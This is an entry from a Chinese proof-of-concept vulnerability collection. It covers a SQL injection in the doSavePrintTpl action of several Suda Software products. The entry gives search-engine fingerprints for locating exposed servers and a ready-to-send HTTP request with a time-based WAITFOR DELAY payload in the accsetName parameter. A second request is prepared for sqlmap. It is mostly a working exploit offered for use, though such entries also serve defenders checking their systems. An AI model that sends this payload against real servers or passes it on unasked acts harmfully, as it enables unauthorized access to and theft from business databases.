---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


# 四、漏洞复现
```plain
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```


sqlmap

```plain
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/giuash5tw64if5lo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
